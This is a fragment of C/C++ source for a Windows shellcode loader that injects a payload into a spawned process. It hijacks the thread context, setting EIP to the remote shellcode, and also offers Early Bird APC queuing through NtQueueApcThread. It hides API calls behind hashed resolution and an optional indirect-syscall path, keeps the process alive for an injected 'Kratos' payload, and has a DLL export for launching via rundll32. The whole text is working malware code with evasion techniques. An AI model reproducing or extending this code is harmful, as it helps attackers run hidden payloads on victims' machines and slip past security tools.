            DBG_HEX("[TH2] Original EIP", (unsigned long long)ctx.Eip);
            ctx.Eip = (DWORD)(ULONG_PTR)remote;
            DBG_HEX("[TH3] New EIP (shellcode)", (unsigned long long)ctx.Eip);
#endif
            NTSTATUS stS = pSCT(pi.hThread, &ctx);
            DBG_HEX("[TH4] NtSetContextThread status", (unsigned long long)(ULONG)stS);
        } else { DBG("[FAIL] NtGet/SetContextThread not found"); }
    }
#else
    {
        DBG("[EB] === EARLY BIRD APC MODE ===");
        typedef NTSTATUS (NTAPI *t_NtQAT)(HANDLE,PVOID,PVOID,PVOID,PVOID);
#ifdef USE_HELLSHALL
        auto pNtQAT = [](HANDLE h, PVOID r, PVOID a1, PVOID a2, PVOID a3) {
            return hg_NtQueueApcThread(h, r, a1, a2, a3); };
#else
        t_NtQAT pNtQAT = (t_NtQAT)resolve(hNtdll, HF_NtQueueApcThread);
        DBG_HEX("[EB1] NtQueueApcThread resolved", (unsigned long long)(ULONG_PTR)pNtQAT);
#endif
        if (pNtQAT) {
            NTSTATUS stA = pNtQAT(pi.hThread, (PVOID)remote, NULL, NULL, NULL);
            DBG_HEX("[EB2] NtQueueApcThread status", (unsigned long long)(ULONG)stA);
            DBG_HEX("[EB2] APC target addr", (unsigned long long)(ULONG_PTR)remote);
        } else { DBG("[FAIL] NtQueueApcThread not found"); }
    }
#endif /* injection technique */

    pNtRT(pi.hThread, NULL);
    DBG("[15] Injection complete - thread resumed");

    typedef BOOL (WINAPI *t_CH)(HANDLE);
    t_CH pCH3 = (t_CH)R(HMOD_KERNEL32, HF_CloseHandle);
    if (pCH3) { pCH3(pi.hThread); pCH3(pi.hProcess); }

#endif /* USE_REMOTE_THREAD */

#if defined(USE_SELF_INJECT) || defined(USE_FIBER_INJECT) || defined(USE_MODULE_STOMP) || defined(USE_LOCAL_MAP_INJECT)
    /* Kratos workers now run in this process - keep the process alive indefinitely */
    DBG("[SLEEP] Keeping process alive for injected payload...");
    {
        typedef NTSTATUS (NTAPI *t_NtDE)(BOOLEAN, PLARGE_INTEGER);
        t_NtDE pNtDE = (t_NtDE)resolve(hNtdll, HF_NtDelayExecution);
        if (pNtDE) {
            LARGE_INTEGER li = {0};
            li.QuadPart = -0x7FFFFFFFFFFFFFFFLL;
            for(;;) pNtDE(FALSE, &li);
        }
    }
#endif

    return 0;
}

#ifdef BUILD_DLL
BOOL WINAPI DllMain(HINSTANCE, DWORD, LPVOID) { return TRUE; }

extern "C" __declspec(dllexport) void __stdcall Run(HWND, HINSTANCE, LPSTR, int) {
    WinMain(NULL, NULL, NULL, 0);
}
#endif
